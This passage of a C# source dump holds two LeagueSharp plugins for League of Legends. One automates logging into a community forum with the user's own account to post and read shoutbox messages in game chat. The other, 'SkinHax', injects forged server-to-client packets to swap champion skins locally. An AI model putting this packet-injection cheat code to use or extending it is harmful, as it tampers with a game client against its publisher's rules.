[assembly: AssemblyConfiguration("")]
[assembly: AssemblyCompany("Shalzuth")]
[assembly: AssemblyProduct("Shoutbox")]
[assembly: AssemblyCopyright("Copyright © 2014")]
[assembly: AssemblyTrademark("")]
[assembly: AssemblyCulture("")]

[assembly: ComVisible(false)]

[assembly: Guid("e6cab8b6-530c-49f3-88e6-f1f6339678d7")]

[assembly: AssemblyVersion("1.0.0.0")]
[assembly: AssemblyFileVersion("1.0.0.0")]

```

`Shoutbox/Shoutbox.cs`:

```cs
using System;
using System.Collections.Generic;
using SysDrawing = System.Drawing;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

using LeagueSharp;

namespace Shoutbox
{
    public class Message
    {
        public String Author;
        public String Msg;
        public String Time;
    }
    public static class Shoutbox
    {
        public static String forumUrl = "http://www.joduska.me/forum/";
        public static WebBrowser wb = new WebBrowser();
        public static List<Message> messages = new List<Message>();
        public static String account = "";
        public static String password = "";
        public static void Process(String msg)
        {
            Shoutbox.Run(Shoutbox.DoWorkMsgAsync, new object[] { account, password, msg });
        }
        public static async Task<object> DoWorkMsgAsync(object[] args)
        {
            using (wb = new WebBrowser())
            {
                wb.ScriptErrorsSuppressed = true;
                TaskCompletionSource<bool> tcs = null;
                WebBrowserDocumentCompletedEventHandler documentCompletedHandler = (s, e) =>
                {
                    if (e.Url.ToString() == forumUrl)
                    {
                        if (wb.Document.GetElementById("sign_in") != null)
                        {
                            wb.Navigate(forumUrl + "index.php?app=core&module=global&section=login");
                        }
                        else
                        {
                            if (args[2].ToString().StartsWith(".sb "))
                            {
                                wb.Document.GetElementById("shoutbox-global-shout").SetAttribute("value", args[2].ToString().Substring(4));
                                wb.Document.GetElementById("shoutbox-submit-button").InvokeMember("click");
                            }
                            else if (args[2].ToString().Equals("update msg"))
                            {
                                HtmlElement tb = wb.Document.GetElementById("shoutbox-shouts-table");
                                HtmlElementCollection shouts = tb.Children[0].Children;
                                for (int i = shouts.Count - 1; i >= 0; i--)
                                {
                                    HtmlElement el = shouts[i];
                                    if (messages.Count(msg => msg.Msg == el.Children[2].Children[1].InnerText) == 0)
                                    {
                                        Message msg = new Message()
                                        {
                                            Author = el.Children[0].Children[1].InnerText,
                                            Msg = el.Children[2].Children[1].InnerText,
                                            Time = el.Children[2].Children[0].InnerText
                                        };
                                        messages.Add(msg);
                                        int count = messages.Count;
                                        Game.PrintChat(msg.Author + " " + msg.Time + ": " + msg.Msg);
                                    }
                                }
                            }
                        }
                    }
                    else if (e.Url.ToString() == forumUrl + "index.php?app=core&module=global&section=login")
                    {
                        ((HtmlElement)wb.Document.All.GetElementsByName("ips_username")[0]).SetAttribute("value", args[0].ToString());
                        ((HtmlElement)wb.Document.All.GetElementsByName("ips_password")[0]).SetAttribute("value", args[1].ToString());
                        foreach (HtmlElement el in wb.Document.GetElementsByTagName("input"))
                        {
                            if (el.GetAttribute("value").Equals("Sign In") && el.GetAttribute("tabindex").Equals("5"))
                            {
                                el.InvokeMember("click");
                            }
                        }
                    }
                    tcs.TrySetResult(true);
                };
                tcs = new TaskCompletionSource<bool>();
                wb.DocumentCompleted += documentCompletedHandler;
                try
                {
                    wb.Navigate(forumUrl);
                    await tcs.Task;
                }
                finally
                {
                    wb.DocumentCompleted -= documentCompletedHandler;
                }
            }
            return null;
        }
        public static async Task<object> Run(Func<object[], Task<object>> worker, params object[] args)
        {
            var tcs = new TaskCompletionSource<object>();
            var thread = new Thread(() =>
            {
                EventHandler idleHandler = null;
                idleHandler = async (s, e) =>
                {
                    Application.Idle -= idleHandler;
                    await Task.Yield();
                    try
                    {
                        var result = await worker(args);
                        tcs.SetResult(result);
                    }
                    catch (Exception ex)
                    {
                        tcs.SetException(ex);
                    }
                    Application.ExitThread();
                };
                Application.Idle += idleHandler;
                Application.Run();
            });
            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();
            try
            {
                return await tcs.Task;
            }
            finally
            {
                thread.Join();
            }
        }
    }
}
```

`Shoutbox/Shoutbox.csproj`:

```csproj
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="12.0" DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
  <PropertyGroup>
    <Configuration Condition=" '$(Configuration)' == '' ">Release</Configuration>
    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
    <ProjectGuid>{4A9F7272-33F7-465C-8BD9-87E801222C9E}</ProjectGuid>
    <OutputType>Exe</OutputType>
    <AppDesignerFolder>Properties</AppDesignerFolder>
    <RootNamespace>Shoutbox</RootNamespace>
    <AssemblyName>Shoutbox</AssemblyName>
    <TargetFrameworkVersion>v4.5</TargetFrameworkVersion>
    <FileAlignment>512</FileAlignment>
    <AutoGenerateBindingRedirects>true</AutoGenerateBindingRedirects>
    <IsWebBootstrapper>false</IsWebBootstrapper>
    <PublishUrl>publish\</PublishUrl>
    <Install>true</Install>
    <InstallFrom>Disk</InstallFrom>
    <UpdateEnabled>false</UpdateEnabled>
    <UpdateMode>Foreground</UpdateMode>
    <UpdateInterval>7</UpdateInterval>
    <UpdateIntervalUnits>Days</UpdateIntervalUnits>
    <UpdatePeriodically>false</UpdatePeriodically>
    <UpdateRequired>false</UpdateRequired>
    <MapFileExtensions>true</MapFileExtensions>
    <ApplicationRevision>0</ApplicationRevision>
    <ApplicationVersion>1.1.0.%2a</ApplicationVersion>
    <UseApplicationTrust>false</UseApplicationTrust>
    <BootstrapperEnabled>true</BootstrapperEnabled>
    <TargetFrameworkProfile />
    <PreBuildEvent />
    <OutputPath>bin\Release</OutputPath>
  </PropertyGroup>
  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
    <PlatformTarget>x86</PlatformTarget>
    <DebugSymbols>true</DebugSymbols>
    <DebugType>full</DebugType>
    <Optimize>false</Optimize>
    <OutputPath>bin\Debug\</OutputPath>
    <DefineConstants>DEBUG;TRACE</DefineConstants>
    <ErrorReport>prompt</ErrorReport>
    <WarningLevel>4</WarningLevel>
  </PropertyGroup>
  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
    <PlatformTarget>x86</PlatformTarget>
    <DebugType>pdbonly</DebugType>
    <Optimize>true</Optimize>
    <OutputPath>bin\Release</OutputPath>
    <DefineConstants>TRACE</DefineConstants>
    <ErrorReport>prompt</ErrorReport>
    <WarningLevel>4</WarningLevel>
  </PropertyGroup>
  <PropertyGroup>
    <ApplicationIcon>
    </ApplicationIcon>
  </PropertyGroup>
  <ItemGroup>
    <Reference Include="LeagueSharp, Version=1.0.0.25, Culture=neutral, processorArchitecture=x86">
      <SpecificVersion>False</SpecificVersion>
      <HintPath>C:\Users\Andy\Downloads\LeagueSharp\\System\LeagueSharp.dll</HintPath>
    </Reference>
    <Reference Include="LeagueSharp.Common">
      <HintPath>C:\Users\Andy\Downloads\LeagueSharp\\System\LeagueSharp.Common.dll</HintPath>
    </Reference>
    <Reference Include="SharpDX, Version=2.5.0.0, Culture=neutral, processorArchitecture=MSIL">
      <SpecificVersion>False</SpecificVersion>
      <HintPath>C:\Users\Andy\Downloads\LeagueSharp\\System\SharpDX.dll</HintPath>
    </Reference>
    <Reference Include="SharpDX.Direct3D9, Version=2.5.0.0, Culture=neutral, processorArchitecture=MSIL">
      <SpecificVersion>False</SpecificVersion>
      <HintPath>C:\Users\Andy\Downloads\LeagueSharp\\System\SharpDX.Direct3D9.dll</HintPath>
    </Reference>
    <Reference Include="System" />
    <Reference Include="System.Core" />
    <Reference Include="System.Drawing" />
    <Reference Include="System.Windows.Forms" />
    <Reference Include="System.Xml.Linq" />
    <Reference Include="System.Data.DataSetExtensions" />
    <Reference Include="Microsoft.CSharp" />
    <Reference Include="System.Data" />
    <Reference Include="System.Xml" />
  </ItemGroup>
  <ItemGroup>
    <Compile Include="Program.cs" />
    <Compile Include="Properties\AssemblyInfo.cs" />
    <Compile Include="Shoutbox.cs" />
  </ItemGroup>
  <ItemGroup>
    <None Include="App.config">
      <SubType>Designer</SubType>
    </None>
  </ItemGroup>
  <ItemGroup>
    <BootstrapperPackage Include=".NETFramework,Version=v4.5.1">
      <Visible>False</Visible>
      <ProductName>Microsoft .NET Framework 4.5.1 %28x86 and x64%29</ProductName>
      <Install>true</Install>
    </BootstrapperPackage>
    <BootstrapperPackage Include="Microsoft.Net.Client.3.5">
      <Visible>False</Visible>
      <ProductName>.NET Framework 3.5 SP1 Client Profile</ProductName>
      <Install>false</Install>
    </BootstrapperPackage>
    <BootstrapperPackage Include="Microsoft.Net.Framework.3.5.SP1">
      <Visible>False</Visible>
      <ProductName>.NET Framework 3.5 SP1</ProductName>
      <Install>false</Install>
    </BootstrapperPackage>
  </ItemGroup>
  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
  <PropertyGroup>
    <PostBuildEvent>
    </PostBuildEvent>
  </PropertyGroup>
  <!-- To modify your build process, add your task inside one of the targets below and uncomment it. 
       Other similar extension points exist, see Microsoft.Common.targets.
  <Target Name="BeforeBuild">
  </Target>
  <Target Name="AfterBuild">
  </Target>
  -->
</Project>
```

`SkinHax/App.config`:

```config
<?xml version="1.0" encoding="utf-8" ?>
<configuration>
    <startup> 
        <supportedRuntime version="v4.0" sku=".NETFramework,Version=v4.5" />
    </startup>
</configuration>
```

`SkinHax/Program.cs`:

```cs
using System;
using System.Collections;
using System.Collections.Generic;
using System.Net;
using System.Threading;
using System.Web.Script.Serialization;
using LeagueSharp;
using LeagueSharp.Common;

namespace SkinHax
{
    internal class Program
    {
        public static Menu Config;
        public static String DataDragonBase = "http://ddragon.leagueoflegends.com/";
        static void Main(string[] args)
        {
            CustomEvents.Game.OnGameLoad += Game_OnGameLoad;
        }

        static void Game_OnGameLoad(EventArgs args)
        {
            new Thread(() =>
            {
                Config = new Menu("SkinHax", "SkinHax", true);
                String versionJson = new WebClient().DownloadString(DataDragonBase + "realms/na.json");
                String gameVersion = (String)((Dictionary<String, Object>)new JavaScriptSerializer().Deserialize<Dictionary<String, Object>>(versionJson)["n"])["champion"];
                foreach (Obj_AI_Hero hero in ObjectManager.Get<Obj_AI_Hero>())
                {
                    String champJson = new WebClient().DownloadString(DataDragonBase + "cdn/" + gameVersion + "/data/en_US/champion/" + hero.ChampionName + ".json");
                    ArrayList skins = (ArrayList)((Dictionary<String, Object>)((Dictionary<String, Object>)new JavaScriptSerializer().Deserialize<Dictionary<String, Object>>(champJson)["data"])[hero.ChampionName])["skins"];
                    Menu champMenu = new Menu(hero.ChampionName, hero.ChampionName, false);
                    foreach (Dictionary<string, object> skin in skins)
                    {
                        String skinName = skin["name"].ToString();
                        if (skinName.Equals("default"))
                            skinName = hero.ChampionName;
                        MenuItem changeSkin = champMenu.AddItem(new MenuItem(skinName, skinName).SetValue<bool>(false));
                        changeSkin.ValueChanged += (s, e) =>
                        {
                            if (e.GetNewValue<bool>())
                            {
                                champMenu.Items.ForEach(p => { if (p.GetValue<bool>() && p.Name != skinName) p.SetValue(false); });
                                Packet.S2C.UpdateModel.Encoded(new Packet.S2C.UpdateModel.Struct(hero.NetworkId, (int)skin["num"], hero.ChampionName)).Process(PacketChannel.S2C);
                            }
                        };
                    }
                    Config.AddSubMenu(champMenu);
                }
                Config.AddToMainMenu();
            }).Start();
        }
    }
}

```

`SkinHax/Properties/AssemblyInfo.cs`:

```cs
using System.Reflection;
using System.Runtime.InteropServices;

[assembly: AssemblyTitle("SkinHax")]
[assembly: AssemblyDescription("")]
[assembly: AssemblyConfiguration("")]
[assembly: AssemblyCompany("Shalzuth")]
[assembly: AssemblyProduct("SkinHax")]
[assembly: AssemblyCopyright("Copyright © 2014")]
[assembly: AssemblyTrademark("")]
[assembly: AssemblyCulture("")]

[assembly: ComVisible(false)]

[assembly: Guid("779f4780-134e-4f5d-98c3-ea58b421f7d7")]

[assembly: AssemblyVersion("1.0.0.0")]
[assembly: AssemblyFileVersion("1.0.0.0")]

```

`SkinHax/SkinHax.csproj`:

```csproj
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="12.0" DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
  <PropertyGroup>
    <Configuration Condition=" '$(Configuration)' == '' ">Release</Configuration>
    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
    <ProjectGuid>{5BFD90B7-8D2C-43E7-B2A0-0A23D63D30B9}</ProjectGuid>
    <OutputType>Exe</OutputType>
    <AppDesignerFolder>Properties</AppDesignerFolder>
    <RootNamespace>SkinHax</RootNamespace>
    <AssemblyName>SkinHax</AssemblyName>
    <TargetFrameworkVersion>v4.5</TargetFrameworkVersion>
    <FileAlignment>512</FileAlignment>
    <PreBuildEvent />
    <PostBuildEvent />
    <OutputPath>bin\Release</OutputPath>
  </PropertyGroup>
  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
    <PlatformTarget>x86</PlatformTarget>
    <DebugSymbols>true</DebugSymbols>
    <DebugType>full</DebugType>
    <Optimize>false</Optimize>
    <OutputPath>bin\Release</OutputPath>
    <DefineConstants>DEBUG;TRACE</DefineConstants>
    <ErrorReport>prompt</ErrorReport>
    <WarningLevel>4</WarningLevel>
  </PropertyGroup>
  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
    <PlatformTarget>x86</PlatformTarget>
    <DebugType>pdbonly</DebugType>
    <Optimize>true</Optimize>
    <OutputPath>bin\Release</OutputPath>
    <DefineConstants>TRACE</DefineConstants>
    <ErrorReport>prompt</ErrorReport>
    <WarningLevel>4</WarningLevel>
  </PropertyGroup>
  <ItemGroup>
    <Reference Include="LeagueSharp">
      <HintPath>C:\Users\Andy\Downloads\LeagueSharp\\System\LeagueSharp.dll</HintPath>
    </Reference>
    <Reference Include="LeagueSharp.Common">
      <HintPath>C:\Users\Andy\Downloads\LeagueSharp\\System\LeagueSharp.Common.dll</HintPath>
    </Reference>
    <Reference Include="System" />
    <Reference Include="System.Core" />
    <Reference Include="System.Web.Extensions" />
    <Reference Include="System.Xml.Linq" />
    <Reference Include="System.Data.DataSetExtensions" />
    <Reference Include="Microsoft.CSharp" />
    <Reference Include="System.Data" />
    <Reference Include="System.Xml" />
  </ItemGroup>
  <ItemGroup>
    <Compile Include="Program.cs" />
    <Compile Include="Properties\AssemblyInfo.cs" />
  </ItemGroup>
  <ItemGroup>
    <None Include="App.config" />
  </ItemGroup>
  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
  <!-- To modify your build process, add your task inside one of the targets below and uncomment it. 
       Other similar extension points exist, see Microsoft.Common.targets.
  <Target Name="BeforeBuild">
  </Target>
  <Target Name="AfterBuild">
  </Target>
  -->
</Project>
```